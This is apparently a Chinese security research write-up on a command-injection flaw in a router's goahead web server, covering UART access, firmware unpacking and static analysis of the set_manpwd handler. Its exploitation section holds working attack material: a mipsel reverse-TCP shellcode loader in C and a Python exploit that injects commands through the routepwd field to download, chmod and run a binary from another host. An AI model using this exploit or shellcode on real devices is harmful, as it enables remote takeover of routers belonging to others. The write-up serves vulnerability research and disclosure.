## 某路由器漏洞

### 调试设备

首先通过路由器上的UART串口，进入路由器的调试窗口。

串口通讯针脚

![image-20201118173219549](https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201118173219549.png)

接上串口模块后，连接计算机

![20201118165834](https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/20201118165834.jpg)

通过串口调试工具来查看输出的调试信息，其中端口号是 COM8，波特率为 57600

![image-20201118173803487](https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201118173803487.png)

连接成功进入 shell，可直接输入命令查看 cpu 等信息

![image-20201118174512699](https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/image-20201118174512699.png)

### 漏洞挖掘





### 漏洞分析

使用 binwalk 解压固件

在 /bin 目录下可以得到路由器的 web服务器的二进制文件 goahead。使用 file 命令查看 goahead 的信息如下：

![img](https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b390d6b2a969.png)

可以看到目标平台是 mips32 位，LSB 字段表明是小端序，指令集为 mips32 rel2。 使用 ida 对 goahead 进行静态分析，在 strings 窗口中直接搜索 set_manpwd ，得到两处字符串。

![img](https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b390e34d34ae.png)

分别查看交叉引用得到 0x46c558 处的字符串在 sub_457ebc 中被引用两次，

![img](https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b39100b3120a.png)

0x46b6b4 处的字符串在 formDefineCGIjson 中被引用了一次。

![img](https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b3910574ca57.png)

查看 formDefineCGIjson 中的引用位置发现 websFormDefine 的第二个参数被置为 sub_457ebc 的指针。

![img](https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b391068d0fae.png)

推断 sub_457ebc 为主要处理 set_manpwd 的函数，进入sub_457ebc 函数发现主要有以下函数调用： 获取 routepwd 的值，该字段正是可以更改密码和命令执行的字段，

![img](https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b390e6acf933.png)

将传入的参数格式化成 json 对象并传入 bs_setmanpwd 函数，同时传入的还有当前栈帧的字符串地址，对 bs_setmanpwd 函数分析之后发现是一个来自 libshare.so 的库函数，且对我们的漏洞并无重大影响

![img](https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b390e7d89d76.png)

对 http 请求进行回复并删除 json 对象。

![img](https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b3910db68c51.png)

获取 password 并使用 password 格式化字符串 “chpasswd.sh admin %s”,可以看出此条命令应该和修改管理员密码有关，继续向下发现 bl_do_system 函数的参数为刚才格式化好的字符串，推测此处应该是修改密码并进行命令执行的地方。

![img](https://img-1253984064.cos.ap-guangzhou.myqcloud.com/5b390e87c11a9.png)



### 漏洞利用

#### 生成 payload

使用 [routersploit](https://github.com/threat9/routersploit) 生成一个 mipsel 下的 reverse_tcp shellcode。routersploit 是一款针对嵌入式设备的开源漏洞检测及利用框架。

![img](https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/image/15137880896364.jpg)

将 shellcode 编写进 c 代码

```
#include <stdio.h>

typedef int(*fun)();

unsigned char sc[] = {
    "\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04"
    "\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20"
    "\x80\x01\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27"
    "\x20\x80\x01\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24"
    "\x0c\x09\x09\x01\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09"
    "\x01\xc9\x0f\x02\x24\x0c\x09\x09\x01\x15\xb3\x05\x3c\x02\x00"
    "\xa5\x34\xf8\xff\xa5\xaf\x10\x65\x05\x3c\xc0\xa8\xa5\x34\xfc"
    "\xff\xa5\xaf\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01"
    "\x4a\x10\x02\x24\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08"
    "\x35\xec\xff\xa8\xaf\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff"
    "\xa8\xaf\xff\xff\x07\x28\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec"
    "\xff\xa4\x23\xec\xff\xa8\x23\xf8\xff\xa8\xaf\xf8\xff\xa5\x23"
    "\xec\xff\xbd\x27\xff\xff\x06\x28\xab\x0f\x02\x24\x0c\x09\x09"
    "\x01"
};

void main(void)
{
    fun pf;
    pf = (fun)sc;
    pf();
}
```



Buildroot编译

```
./mipsel-linux-gcc mipsel-reverse-tcp.c -o x
```



**EXP**

```python
# coding:utf-8
import   requests
import   telnetlib
import   time
import   sys

host  =  "192.168.16.1"
port = "23"
password= "iot_pwn_test"

headers = { 'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36',
            'Accept-Language'    : 'zh-CN,zh;q=0.8',
            'Content-Type':	'application/x-www-form-urlencoded'
          }

def command(con, flag, str_=""):
    data = con.read_until(flag.encode())
    print(data.decode(errors='ignore'))
    con.write(str_.encode() + b"\n")
    return data

def  set_pwd():
	url="http://%s/goform/set_manpwd" % (host)
	cookies = dict(platform='0',user='admin')
	data= {'type':'setmanpwd','routepwd':'iot_pwn_test'}
	r = requests.post(url, data= data ,cookies= cookies)

def  exploit(str):
	url="http://%s/goform/set_manpwd" % (host)
	cookies = dict(platform='0',user='admin')
	data= {'type':'setmanpwd','routepwd':'iot_pwn_test%0A &&  '+str}
	r = requests.post(url, data= data ,cookies= cookies)
	print r.text

def  execute():
	tn = telnetlib.Telnet(host)
	command(tn, "login: ", "admin")
	if password:
	    command(tn, "Password:", password)
	command(tn, "$", "ls")
	command(tn, "$", " exit")
	command(tn, "$", "")
	tn.close()

exploit('wget  http://192.168.16.103/x  -O  /tmp/a   &&  chmod  777  /tmp/a  &&   /tmp/a')

set_pwd()
```



